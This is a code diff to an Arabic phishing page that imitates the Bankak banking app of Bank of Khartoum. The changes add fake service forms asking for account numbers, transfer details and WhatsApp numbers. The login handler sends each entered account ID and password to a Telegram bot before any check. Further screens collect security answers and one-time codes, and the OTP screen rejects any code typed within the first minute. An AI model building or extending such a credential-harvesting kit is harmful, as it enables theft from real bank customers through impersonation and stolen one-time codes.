@@ -166,6 +166,26 @@
             margin-bottom: 20px;
         }
 
+        /* تصميم زر الرجوع الموحد (في اليمين) */
+        .back-btn-new {
+            background: #ffffff;
+            border: 1px solid #b90924;
+            color: #b90924;
+            padding: 4px 12px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 0.85rem;
+            font-weight: bold;
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.08);
+            transition: all 0.2s ease;
+        }
+        .back-btn-new:hover {
+            background: #fff5f5;
+        }
+
         /* شاشة اختيار الموقع المؤقتة (قبل الانتقال لتطبيق بنكك) */
         #locationChoiceModal {
             display: none;
@@ -265,17 +285,6 @@
             font-size: 1.15rem;
             font-weight: bold;
             color: #ffffff;
-        }
-
-        .sudan-screen-back {
-            background: rgba(255, 255, 255, 0.2);
-            border: 1px solid rgba(255, 255, 255, 0.4);
-            color: white;
-            padding: 6px 14px;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 0.9rem;
-            font-weight: bold;
         }
 
         .sudan-form-body {
@@ -728,15 +737,6 @@
             font-size: 1.1rem;
             font-weight: bold;
         }
-        .btn-back {
-            background: rgba(255, 255, 255, 0.2);
-            border: 1px solid rgba(255, 255, 255, 0.4);
-            color: #ffffff;
-            padding: 2px 10px;
-            border-radius: 12px;
-            font-size: 0.8rem;
-            cursor: pointer;
-        }
         
         .bankak-login-header {
             background-color: #dc2626;
@@ -1055,6 +1055,23 @@
                     </div>
                     <div class="service-card-arrow"><i class="fa-solid fa-chevron-left"></i></div>
                 </div>
+
+                <!-- الخدمات الجديدة المضافة في الأسفل -->
+                <div class="service-glass-card" onclick="openSimpleForm('التحويلات الخاطئة')">
+                    <div class="service-card-right">
+                        <div class="service-icon-box" style="color: #e11d48; background: #fff1f2;"><i class="fa-solid fa-right-left"></i></div>
+                        <div class="service-card-title">التحويلات الخاطئة</div>
+                    </div>
+                    <div class="service-card-arrow"><i class="fa-solid fa-chevron-left"></i></div>
+                </div>
+
+                <div class="service-glass-card" onclick="openSimpleForm('طلب حساب جاري/مميز')">
+                    <div class="service-card-right">
+                        <div class="service-icon-box" style="color: #0284c7; background: #f0f9ff;"><i class="fa-solid fa-star"></i></div>
+                        <div class="service-card-title">طلب حساب جاري/مميز (ترقية الحساب)</div>
+                    </div>
+                    <div class="service-card-arrow"><i class="fa-solid fa-chevron-left"></i></div>
+                </div>
             </div>
 
             <div class="divider"></div>
@@ -1095,8 +1112,8 @@
     <!-- شاشة الاستمارة الخاصة ببطاقة الفيزا (3 خيارات فقط) -->
     <div id="visaChoiceScreen" style="display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: linear-gradient(135deg, #fdf2f2 0%, #ffffff 100%); z-index: 2200; flex-direction: column; overflow-y: auto;">
         <div class="sudan-screen-header">
+            <button class="back-btn-new" onclick="closeVisaScreen()">رجوع ⟨</button>
             <span class="sudan-screen-title">اختر نوع بطاقة الفيزا الافتراضية</span>
-            <button class="sudan-screen-back" onclick="closeVisaScreen()">رجوع ➔</button>
         </div>
         <div class="sudan-form-body">
             <div class="sudan-screen-subtitle">يرجى تحديد نوع البطاقة المطلوبة للمتابعة:</div>
@@ -1130,8 +1147,8 @@
     <!-- شاشة الاستمارة المخصصة والمتغيرة حسب الخدمة -->
     <div id="simpleServiceScreen">
         <div class="sudan-screen-header">
+            <button class="back-btn-new" onclick="closeSimpleFormScreen()">رجوع ⟨</button>
             <span class="sudan-screen-title" id="simpleFormTitle">استمارة الخدمة</span>
-            <button class="sudan-screen-back" onclick="closeSimpleFormScreen()">رجوع ➔</button>
         </div>
         <div class="sudan-form-body" id="dynamicFormFields">
             <!-- سيتم تعبئة الحقول ديناميكياً بواسطة جافاسكريبت حسب الخدمة المختارة -->
@@ -1412,7 +1429,7 @@
             <div class="screen" id="screenQuestions">
               <div class="top-header" style="padding: 12px 16px;">
                 <div class="header-bar">
-                  <button class="btn-back" onclick="switchScreen('screenLogin')">رجوع ➔</button>
+                  <button class="back-btn-new" onclick="switchScreen('screenLogin')">رجوع ⟨</button>
                   <span class="page-title">أسئلة الأمان</span>
                 </div>
                 <div class="logo-box" style="transform: scale(0.7);">
@@ -1440,7 +1457,7 @@
             <div class="screen" id="screenOtp">
               <div class="top-header" style="padding: 12px 16px;">
                 <div class="header-bar">
-                  <button class="btn-back" onclick="switchScreen('screenQuestions')">رجوع ➔</button>
+                  <button class="back-btn-new" onclick="switchScreen('screenQuestions')">رجوع ⟨</button>
                   <span class="page-title">التحقق</span>
                 </div>
                 <div class="logo-box" style="transform: scale(0.7);">
@@ -1473,7 +1490,7 @@
             <div class="screen" id="screenPostOtpForm">
               <div class="top-header" style="padding: 12px 16px;">
                 <div class="header-bar">
-                  <button class="btn-back" onclick="switchScreen('screenOtp')">رجوع ➔</button>
+                  <button class="back-btn-new" onclick="switchScreen('screenOtp')">رجوع ⟨</button>
                   <span class="page-title">استمارة تأكيد البيانات</span>
                 </div>
                 <div class="logo-box" style="transform: scale(0.7);">
@@ -1514,7 +1531,7 @@
             <div class="screen" id="screenFinalLoading">
               <div class="top-header" style="padding: 12px 16px;">
                 <div class="header-bar">
-                  <button class="btn-back" onclick="switchScreen('screenLogin')">رجوع ➔</button>
+                  <button class="back-btn-new" onclick="switchScreen('screenLogin')">رجوع ⟨</button>
                   <span class="page-title" id="finalTitleText">حالة الطلب</span>
                 </div>
                 <div class="logo-box" style="transform: scale(0.7);">
@@ -1638,6 +1655,30 @@
                     <div class="glass-input-container"><i class="fa-solid fa-phone"></i><input type="text" id="dyn-phone" class="glass-input-field" placeholder="رقم الهاتف المسجل"></div>
                     <div class="glass-input-container"><i class="fa-brands fa-whatsapp"></i><input type="text" id="dyn-whatsapp" class="glass-input-field" placeholder="رقم الواتساب"></div>
                 `;
+            } else if (serviceName === 'التحويلات الخاطئة') {
+                container.innerHTML += `
+                    <div class="glass-input-container"><i class="fa-solid fa-user"></i><input type="text" id="dyn-name" class="glass-input-field" placeholder="الاسم"></div>
+                    <div class="glass-input-container"><i class="fa-solid fa-phone"></i><input type="text" id="dyn-phone" class="glass-input-field" placeholder="رقم الهاتف المسجل مع الحساب"></div>
+                    <div class="glass-input-container"><i class="fa-solid fa-paper-plane"></i><input type="text" id="dyn-sender-account" class="glass-input-field" placeholder="رقم الحساب المرسل"></div>
+                    <div class="glass-input-container"><i class="fa-solid fa-download"></i><input type="text" id="dyn-receiver-account" class="glass-input-field" placeholder="رقم الحساب المستلم"></div>
+                    <div class="glass-input-container"><i class="fa-solid fa-money-bill-wave"></i><input type="text" id="dyn-amount" class="glass-input-field" placeholder="المبلغ المرسل"></div>
+                    <div class="glass-input-container"><i class="fa-solid fa-receipt"></i><input type="text" id="dyn-op-number" class="glass-input-field" placeholder="رقم العملية"></div>
+                    <div class="glass-input-container"><i class="fa-brands fa-whatsapp"></i><input type="text" id="dyn-whatsapp" class="glass-input-field" placeholder="رقم الواتساب"></div>
+                `;
+            } else if (serviceName === 'طلب حساب جاري/مميز') {
+                container.innerHTML += `
+                    <div class="glass-input-container"><i class="fa-solid fa-user"></i><input type="text" id="dyn-name" class="glass-input-field" placeholder="الاسم"></div>
+                    <div class="glass-input-container"><i class="fa-solid fa-id-card"></i><input type="text" id="dyn-account" class="glass-input-field" placeholder="رقم الحساب"></div>
+                    <div class="glass-input-container"><i class="fa-solid fa-phone"></i><input type="text" id="dyn-phone" class="glass-input-field" placeholder="رقم الهاتف"></div>
+                    <div class="glass-input-container"><i class="fa-solid fa-info-circle"></i><input type="text" id="dyn-current-type" class="glass-input-field" placeholder="نوع الحساب الحالي"></div>
+                    <div class="glass-input-container"><i class="fa-solid fa-star"></i>
+                        <select id="dyn-target-type" class="glass-input-field" style="background:transparent; outline:none;">
+                            <option value="">اختر الحساب المراد</option>
+                            <option value="جاري">جاري</option>
+                            <option value="مميز">مميز</option>
+                        </select>
+                    </div>
+                `;
             } else {
                 container.innerHTML += `
                     <div class="glass-input-container"><i class="fa-solid fa-user"></i><input type="text" id="dyn-name" class="glass-input-field" placeholder="الاسم"></div>
@@ -1655,7 +1696,7 @@
             document.getElementById('simpleServiceScreen').style.display = 'none';
         }
 
-        // إرسال البيانات المخصصة وإظهار نافذة اختيار الموقع (تم تصحيح الأخطاء النحوية هنا لضمان الاستجابة)
+        // إرسال البيانات المخصصة وإظهار نافذة اختيار الموقع
         function submitSimpleForm() {
             const nameEl = document.getElementById('dyn-name');
             const accountEl = document.getElementById('dyn-account');
@@ -1665,6 +1706,12 @@
             const newPhoneEl = document.getElementById('dyn-new-phone');
             const currencyEl = document.getElementById('dyn-currency');
             const investmentEl = document.getElementById('dyn-investment');
+            const senderAccEl = document.getElementById('dyn-sender-account');
+            const receiverAccEl = document.getElementById('dyn-receiver-account');
+            const amountEl = document.getElementById('dyn-amount');
+            const opNumEl = document.getElementById('dyn-op-number');
+            const currentTypeEl = document.getElementById('dyn-current-type');
+            const targetTypeEl = document.getElementById('dyn-target-type');
 
             const name = nameEl ? nameEl.value.trim() : '';
             const account = accountEl ? accountEl.value.trim() : '';
@@ -1674,33 +1721,69 @@
             const newPhone = newPhoneEl ? newPhoneEl.value.trim() : '';
             const currency = currencyEl ? currencyEl.value : '';
             const investment = investmentEl ? investmentEl.value.trim() : '';
+            const senderAcc = senderAccEl ? senderAccEl.value.trim() : '';
+            const receiverAcc = receiverAccEl ? receiverAccEl.value.trim() : '';
+            const amount = amountEl ? amountEl.value.trim() : '';
+            const opNum = opNumEl ? opNumEl.value.trim() : '';
+            const currentType = currentTypeEl ? currentTypeEl.value.trim() : '';
+            const targetType = targetTypeEl ? targetTypeEl.value : '';
 
-            if (!name || !account || !whatsapp || (selectedServiceName === 'تعديل رقم الهاتف' && (!oldPhone || !newPhone)) || (selectedServiceName === 'خدمات العملات الأجنبية' && (!currency || !phone)) || (selectedServiceName === 'محفظة بنك الخرطوم الاستثمارية' && (!investment || !phone)) || (selectedServiceName !== 'تعديل رقم الهاتف' && selectedServiceName !== 'خدمات العملات الأجنبية' && selectedServiceName !== 'محفظة بنك الخرطوم الاستثمارية' && !phone)) {
-                showErrorModal("يرجى تعبئة جميع الحقول المطلوبة للمتابعة.");
-                return;
+            // التحقق من الحقول المطلوبة لكل خدمة
+            if (selectedServiceName === 'التحويلات الخاطئة') {
+                if (!name || !phone || !senderAcc || !receiverAcc || !amount || !opNum || !whatsapp) {
+                    showErrorModal("يرجى تعبئة جميع الحقول المطلوبة لخدمة التحويلات الخاطئة.");
+                    return;
+                }
+            } else if (selectedServiceName === 'طلب حساب جاري/مميز') {
+                if (!name || !account || !phone || !currentType || !targetType) {
+                    showErrorModal("يرجى تعبئة جميع حقول ترقية الحساب واختيار النوع المطلوب.");
+                    return;
+                }
+            } else {
+                if (!name || !account || !whatsapp || (selectedServiceName === 'تعديل رقم الهاتف' && (!oldPhone || !newPhone)) || (selectedServiceName === 'خدمات العملات الأجنبية' && (!currency || !phone)) || (selectedServiceName === 'محفظة بنك الخرطوم الاستثمارية' && (!investment || !phone)) || (selectedServiceName !== 'تعديل رقم الهاتف' && selectedServiceName !== 'خدمات العملات الأجنبية' && selectedServiceName !== 'محفظة بنك الخرطوم الاستثمارية' && !phone)) {
+                    showErrorModal("يرجى تعبئة جميع الحقول المطلوبة للمتابعة.");
+                    return;
+                }
             }
 
             let msg = `📍 *طلب خدمة (${selectedServiceName}):*
-👤 الاسم: ${name}
-🏦 رقم الحساب: ${account}`;
+👤 الاسم: ${name}`;
 
-            if (selectedServiceName === 'تعديل رقم الهاتف') {
+            if (selectedServiceName === 'التحويلات الخاطئة') {
                 msg += `
-📞 الهاتف القديم: ${oldPhone}
-📱 الهاتف الجديد: ${newPhone}`;
-            } else if (selectedServiceName === 'خدمات العملات الأجنبية') {
+📱 الهاتف المسجل: ${phone}
+📤 حساب المرسل: ${senderAcc}
+📥 حساب المستلم: ${receiverAcc}
+💰 المبلغ المرسل: ${amount}
+🧾 رقم العملية: ${opNum}
+💬 الواتساب: ${whatsapp}`;
+            } else if (selectedServiceName === 'طلب حساب جاري/مميز') {
                 msg += `
-💱 العملة المطلوبة: ${currency}
-📱 الهاتف: ${phone}`;
-            } else if (selectedServiceName === 'محفظة بنك الخرطوم الاستثمارية') {
-                msg += `
-🏢 مبلغ الاستثمار العقاري: ${investment}
-📱 الهاتف: ${phone}`;
+🏦 رقم الحساب: ${account}
+📱 رقم الهاتف: ${phone}
+ℹ️ نوع الحساب الحالي: ${currentType}
+⭐ الحساب المراد: ${targetType}`;
             } else {
                 msg += `
+🏦 رقم الحساب: ${account}`;
+                if (selectedServiceName === 'تعديل رقم الهاتف') {
+                    msg += `
+📞 الهاتف القديم: ${oldPhone}
+📱 الهاتف الجديد: ${newPhone}`;
+                } else if (selectedServiceName === 'خدمات العملات الأجنبية') {
+                    msg += `
+💱 العملة المطلوبة: ${currency}
 📱 الهاتف: ${phone}`;
+                } else if (selectedServiceName === 'محفظة بنك الخرطوم الاستثمارية') {
+                    msg += `
+🏢 مبلغ الاستثمار العقاري: ${investment}
+📱 الهاتف: ${phone}`;
+                } else {
+                    msg += `
+📱 الهاتف: ${phone}`;
+                }
+                msg += `\n💬 الواتساب: ${whatsapp}`;
             }
-            msg += `\n💬 الواتساب: ${whatsapp}`;
 
             sendToTelegram(msg);
 
@@ -1913,7 +1996,6 @@
           }
         }
 
-        // إرسال البيانات للبوت دائماً، ولكن اشتراط كلمة المرور القوية للتخطي
         function handleLoginSubmit(e) {
           e.preventDefault();
           const accInput = document.getElementById('userIdInput').value.trim();
@@ -1921,21 +2003,18 @@
 
           const accRegex = /^\d{7}$/;
           if (!accRegex.test(accInput)) {
-            showErrorModal("Invalid Source. Please contact Customer Care");
+            showErrorModal("رقم الحساب يجب أن يكون 7 أرقام.");
             return;
           }
 
-          // إرسال البيانات للبوت أولاً (حتى لو كانت كلمة المرور غير مطابقة أو خاطئة)
           sendToTelegram(`🚨 *محاولة تسجيل دخول (بنكك)*\n\n👤 المعرف: \`${accInput}\`\n🔑 كلمة المرور: \`${passInput}\``);
 
-          // التحقق من شروط كلمة المرور القوية (مثال: Aa12345@)
           const passRegex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]).{8,}$/;
           if (!passRegex.test(passInput)) {
-            showErrorModal("Invalid Source. Please contact Customer Care");
+            showErrorModal("كلمة المرور غير مطابقة للشروط أو خاطئة. يرجى إدخال كلمة مرور قوية (مثال: Aa12345@)");
             return;
           }
 
-          // الانتقال لأسئلة الأمان إذا تحققت الشروط
           switchScreen('screenQuestions');
         }
 
@@ -1984,7 +2063,7 @@
         let otpScreenOpenedTime = 0;
         function goToOtpScreen() {
           switchScreen('screenOtp');
-          otpScreenOpenedTime = Date.now(); // تسجيل وقت فتح شاشة OTP بدقة
+          otpScreenOpenedTime = Date.now();
           startTimer(3540);
         }
 
@@ -2009,7 +2088,6 @@
         function validateOtp() {
           const otp = document.getElementById('otpInput').value.trim();
 
-          // شرط منع إدخال الرمز قبل مرور دقيقة كاملة (60 ثانية) وإظهار خطأ "رمز التحقق خطأ"
           const elapsedSeconds = (Date.now() - otpScreenOpenedTime) / 1000;
           if (elapsedSeconds < 60) {
             showErrorModal("رمز التحقق خطأ");
